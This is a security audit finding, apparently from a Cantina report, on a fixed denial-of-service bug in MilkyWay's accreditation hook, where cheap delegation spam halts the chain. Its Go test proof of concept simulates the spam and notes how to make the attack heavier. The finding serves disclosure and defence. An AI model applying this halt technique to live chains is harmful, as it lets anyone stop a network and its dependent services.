---
tags:
  - lang/solidity
  - platform/cantina
  - has/poc
  - severity/high
  - sector/governance
  - sector/restaking
  - sector/staking
protocol: "[[MilkyWay]]"
auditors:
  - "[[alpo]]"
report: "https://cdn.cantina.xyz/reports/report_cantina_solo_milkyway_january2025.pdf"
genome:
  - "[[griefing]]"
  - "[[permanent]]"
  - "[[dos-resistance]]"
  - "[[proposal-state-check]]"
  - "[[vote-delegation-loop]]"
---
# Chain can be halted permissionlessly on any update to accreditation status 

- id: 46095
- impact: HIGH
- protocol: [[MilkyWay]]
- reporter: alpo (Cantina)
- source: https://cdn.cantina.xyz/reports/report_cantina_solo_milkyway_january2025.pdf

## Summary


This bug report discusses a potential vulnerability in the governance-triggered AccreditService and RevokeServiceAccreditation messages. The bug allows an attacker to cheaply spam delegations once an accreditation change proposal is on track to pass, causing a chain halt on the block the proposal is executed. This can be done by adding a large number of pool delegations with accrued rewards, which can be made more cost-effective by increasing the number of delegations. This can lead to unexpected chain halts and breaks the security guarantees of all active AVSs. The recommended solution is to add linear scaling gas costs to all delegation types, which has been fixed in PR 26. 

## Details

## Context
**File:** `hooks.go#L146`

## Description
Linear iteration in service delegations to check user preference trust updates in the `AfterServiceAccreditationModified` hook, which is called in the governance-triggered `AccreditService` and `RevokeServiceAccreditation` messages. Since governance-triggered execution is unmetered, an attacker could cheaply spam delegations once an accreditation change proposal is on track to imminently pass, triggering a chain halt on the block the proposal is executed.

## Proof of Concept
The following Go test covers a proof of concept (PoC) of the chain halt. It is kept relatively light for simplicity, but an attacker can cheaply add an order of magnitude of weight to the halt by adding 5-10 pool delegations with accrued rewards to each delegator address (as the length of the halt is dominated by `SendCoins` execution):

```go
func (suite *KeeperTestSuite) TestServiceAccreditationModification_DOS() {
    // Adjust these values to simulate different scenarios
    numDelegations := 100000
    delegationsPerBlock := 5000

    // --- Setup 
---
    // Cache the context to avoid conflicts
    ctx, _ := suite.ctx.CacheContext()
    // Set up a sample service with initial accreditation status
    service, _ := suite.setupSampleServiceAndOperator(ctx)
    service.Accredited = true
    err := suite.servicesKeeper.SaveService(ctx, service)
    suite.Require().NoError(err)

    // Create a rewards plan to simulate rewards allocation,
    // as this amplifies the impact of the DOS vector
    planStartTime := ctx.BlockTime()
    planEndTime := planStartTime.Add(24 * time.Hour)
    amountPerDay := sdk.NewCoins(sdk.NewInt64Coin("service", 1_000_000_000))
    suite.CreateBasicRewardsPlan(
        ctx,
        service.ID,
        amountPerDay,
        planStartTime,
        planEndTime,
        amountPerDay,
    )

    // Call AllocateRewards to set last rewards allocation time
    err = suite.keeper.AllocateRewards(ctx)
    suite.Require().NoError(err)

    // Fixed seed for reproducibility
    rng := rand.New(rand.NewSource(1234))

    // Simulate an attacker spamming delegations across multiple blocks
    for i := 0; i < numDelegations; i += delegationsPerBlock {
        endIndexForCurrentBlock := i + delegationsPerBlock
        if endIndexForCurrentBlock > numDelegations {
            endIndexForCurrentBlock = numDelegations
        }

        // Create delegations for the current block
        for j := i; j < endIndexForCurrentBlock; j++ {
            // Generate random number for address while maintaining uniqueness
            delegatorAddr := testutil.TestAddress(uint64(rng.Intn(10000)))

            // Fund the delegator's account
            suite.FundAccount(
                ctx,
                delegatorAddr.String(),
                sdk.NewCoins(sdk.NewInt64Coin("umilk", 100_000_000)),
            )

            // Set user preferences after delegation
            err = suite.restakingKeeper.SetUserPreferences(
                ctx,
                delegatorAddr.String(),
                restakingtypes.UserPreferences{
                    TrustNonAccreditedServices: false,
                    TrustAccreditedServices: true,
                    TrustedServicesIDs: nil,
                },
            )
            suite.Require().NoError(err)

            // Delegate to the service
            suite.DelegateService(
                ctx,
                service.ID,
                sdk.NewCoins(sdk.NewInt64Coin("umilk", 100_000_000)),
                delegatorAddr.String(),
                true,
            )

            // Note: this DOS vector can be made arbitrarily heavier by increasing the number of pool delegations,
            // that have accrued rewards. This block here is kept as a placeholder and adds very little weight
            // to the halt, but can be extended to make the attack vector more cost-effective for longer halts.
            suite.DelegatePool(
                ctx,
                sdk.NewInt64Coin("umilk", 100_000_000),
                delegatorAddr.String(),
                true,
            )
        }
        fmt.Printf("Created %d delegations at block %d\n", delegationsPerBlock, ctx.BlockHeight())

        // Advance block
        ctx = ctx.WithBlockHeight(ctx.BlockHeight() + 1)
    }

    // Allocate rewards to add SendCoins weight to the DOS vector
    ctx = suite.allocateRewards(ctx, 10*time.Second)

    // --- Trigger accreditation modification post hook 
---
    // Now trigger the accreditation modification which will invoke the hook
    fmt.Println("Commencing AfterServiceAccreditationModified call...")
    startTime := time.Now()
    err = suite.keeper.AfterServiceAccreditationModified(ctx, service.ID)
    suite.Require().NoError(err)

    // --- End of chain halt 
---
    duration := time.Since(startTime)
    fmt.Printf("Halted chain for %s\n", duration)
}
```

## Likelihood
Any actor can permissionlessly trigger this chain halt on any accreditation change proposal passing without any repercussions.

## Impact
An unexpected chain halt breaks the security guarantees of all active AVSs.

## Recommendation
Ideally, it would be possible to avoid linearly iterating over user preferences at all, but this would require changes to the user preference mechanism and a deep refactor. The simpler short-term solution to this issue would be to add linear scaling gas costs to all delegation types, which should make delegation spam of this sort prohibitively expensive. This would entail adding a `baseDelegationGasCharge` that is scaled by `len(existingDelegations)`, so the 10th delegation would cost an additional `10 * baseDelegationGasCharge`.

## MilkyWay
Fixed in PR 26.

## Alpo
Fix verified.
